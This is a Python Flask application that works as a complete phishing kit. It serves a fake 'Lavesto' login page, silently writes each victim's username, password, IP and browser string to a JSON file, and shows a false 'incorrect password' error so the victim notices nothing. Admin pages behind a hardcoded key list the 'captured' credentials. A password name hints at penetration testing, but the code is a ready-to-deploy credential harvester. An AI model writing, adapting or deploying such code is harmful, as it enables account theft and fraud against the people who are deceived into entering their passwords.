from flask import Flask, request, redirect, render_template_string, jsonify
import json
from datetime import datetime
import os

app = Flask(__name__)

# Your exact HTML/CSS/JS as a template string
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lavesto • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #1a282f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .logo-holder {
            width: 80px;
            height: 80px;
            margin-bottom: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .logo-holder img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .error-message {
            background-color: rgba(255, 69, 58, 0.15);
            border: 1px solid #ff453a;
            color: #ff453a;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            width: 100%;
            margin-bottom: 8px;
            display: none;
        }

        .error-message.visible {
            display: block;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 24px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-group input {
            width: 100%;
            padding: 16px;
            padding-right: 48px;
            background-color: #1e2e36;
            border: 1px solid #364954;
            border-radius: 12px;
            font-size: 15px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input::placeholder {
            color: #788c96;
        }

        .input-group input:focus {
            border-color: #0064e0;
        }

        .password-group {
            display: flex;
            align-items: center;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            background: none;
            border: none;
            cursor: pointer;
            display: none;
            padding: 4px;
        }

        .password-toggle svg {
            width: 22px;
            height: 22px;
            stroke: #788c96;
            transition: stroke 0.2s;
        }

        .password-toggle:hover svg {
            stroke: #ffffff;
        }

        .btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            text-decoration: none;
            border-radius: 25px;
            transition: background-color 0.2s, opacity 0.2s;
            cursor: pointer;
        }

        .btn-login {
            background-color: #0064e0;
            color: #ffffff;
            border: none;
        }

        .btn-login:hover {
            background-color: #0056c6;
        }

        .forgot-password {
            color: #ffffff;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 50px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .btn-create {
            background-color: transparent;
            color: #3897f0;
            border: 1px solid #364954;
        }

        .btn-create:hover {
            background-color: rgba(56, 151, 240, 0.08);
            border-color: #3897f0;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-holder">
            <img src="your-logo-here.png" alt="Lavesto Logo">
        </div>

        {% if error == 'invalid' %}
        <div class="error-message visible" id="errorMessage">
            Sorry, your password was incorrect. Please double-check your password.
        </div>
        {% else %}
        <div class="error-message" id="errorMessage">
            Sorry, your password was incorrect. Please double-check your password.
        </div>
        {% endif %}

        <form id="loginForm" method="POST" action="/login">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Username, email address or mobile number" required autocomplete="username">
            </div>
            
            <div class="input-group password-group">
                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
                    <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
                    </svg>
                </button>
            </div>

            <button type="submit" class="btn btn-login">Log in</button>
        </form>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <a href="#" class="btn btn-create">Create new account</a>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const passwordInput = document.getElementById('password');
            const togglePasswordBtn = document.getElementById('togglePassword');
            const eyeIcon = document.getElementById('eye-icon');

            const eyeHiddenPath = `<path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />`;
            const eyeVisiblePath = `<path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" /><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />`;

            passwordInput.addEventListener('input', () => {
                if (passwordInput.value.length > 0) {
                    togglePasswordBtn.style.display = 'block';
                } else {
                    togglePasswordBtn.style.display = 'none';
                }
            });

            togglePasswordBtn.addEventListener('click', () => {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    eyeIcon.innerHTML = eyeVisiblePath;
                } else {
                    passwordInput.type = 'password';
                    eyeIcon.innerHTML = eyeHiddenPath;
                }
            });
        });
    </script>
</body>
</html>
"""


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    return render_template_string(HTML_TEMPLATE, error=error)


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Store credentials
    data_file = 'credentials.json'
    structured = []
    if os.path.exists(data_file):
        with open(data_file, 'r') as f:
            try:
                structured = json.load(f)
            except json.JSONDecodeError:
                structured = []

    structured.append({
        'timestamp': timestamp,
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': user_agent
    })

    with open(data_file, 'w') as f:
        json.dump(structured, f, indent=4)

    # Redirect back with error — user has NO IDEA
    return redirect('/?error=invalid')


@app.route('/admin', methods=['GET'])
def view_creds():
    # Simple password check via query param (change this)
    key = request.args.get('key', '')
    if key != 'P3nt3st3r!2024':
        return 'Access denied. Use ?key=P3nt3st3r!2024', 401

    data_file = 'credentials.json'
    if os.path.exists(data_file):
        with open(data_file, 'r') as f:
            try:
                structured = json.load(f)
            except json.JSONDecodeError:
                structured = []
    else:
        structured = []

    return jsonify(structured)


@app.route('/admin-view', methods=['GET'])
def view_creds_html():
    key = request.args.get('key', '')
    if key != 'P3nt3st3r!2024':
        return 'Access denied. Use ?key=P3nt3st3r!2024', 401

    data_file = 'credentials.json'
    if os.path.exists(data_file):
        with open(data_file, 'r') as f:
            try:
                structured = json.load(f)
            except json.JSONDecodeError:
                structured = []
    else:
        structured = []

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Captured </title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
            h1 { color: #ff4444; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { background: #1a1a1a; color: #ff4444; padding: 10px; text-align: left; border-bottom: 2px solid #333; }
            td { padding: 10px; border-bottom: 1px solid #222; word-break: break-all; }
            tr:hover { background: #111; }
            .stats { margin: 20px 0; display: flex; gap: 20px; }
            .stat-box { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 4px; }
            .stat-box .num { font-size: 28px; font-weight: bold; color: #00ff00; }
        </style>
    </head>
    <body>
        <h1>🔴 CAPTURED CDLS</h1>
        <div class="stats">
            <div class="stat-box"><div class="num">""" + str(len(structured)) + """</div><div>Total</div></div>
            <div class="stat-box"><div class="num">""" + str(len(set([e['ip'] for e in structured]))) if structured else '0' + """</div><div>Unique IPs</div></div>
        </div>
        <table>
            <tr><th>#</th><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
    """

    if not structured:
        html += '<tr><td colspan="5" style="text-align:center;color:#666;">No credentials captured yet</td></tr>'
    else:
        for i, e in enumerate(reversed(structured)):
            html += f'<tr><td>{i+1}</td><td>{e["timestamp"]}</td><td>{e["ip"]}</td><td><strong>{e["username"]}</strong></td><td style="color:#ff6b6b;">{e["password"]}</td></tr>'

    html += """
        </table>
    </body>
    </html>
    """
    return html


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
